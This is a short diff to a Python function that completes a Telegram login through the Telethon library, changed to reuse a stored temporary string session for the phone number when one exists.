@@ -115,12 +115,13 @@ def verify_code():
     phone_code_hash = row[0]
 
     async def _verify():
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        user = await client.sign_in(
-            phone=phone,
-            code=code,
-            phone_code_hash=phone_code_hash
+        from telethon.sessions import StringSession
+
+        session = get_temp_session(phone)
+        client = TelegramClient(
+            StringSession(session) if session else StringSession(),
+            API_ID,
+            API_HASH
         )
 
         # ✅ STRING SESSION OLAMIZ
